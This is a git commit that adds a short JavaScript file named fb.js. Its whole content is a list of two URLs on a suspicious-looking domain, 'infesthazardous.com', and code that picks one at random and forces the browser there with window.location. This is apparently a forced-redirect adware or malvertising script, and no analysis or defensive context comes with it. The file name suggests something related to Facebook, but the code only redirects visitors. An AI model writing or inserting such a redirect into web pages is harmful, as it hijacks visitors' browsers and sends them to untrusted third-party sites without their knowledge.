d42df558a720407d6ae4cb5e8feffa27d51f7d11
mahdi8844 <84512629+mahdi8844@users.noreply.github.com>
2021-10-29 10:17:27 +0800

    Create fb.js

---
+++ fb.js
@@ -0,0 +1,11 @@
+
+var dataUrl = [
+  
+  'https://infesthazardous.com/q38569tt?key=c44d38ca5e7be1454d233de6c29c3adc',
+  'https://infesthazardous.com/gp0h8aj0sy?key=c7a74a7bcb083f9c36c764b44c4830f7'
+
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
+ad
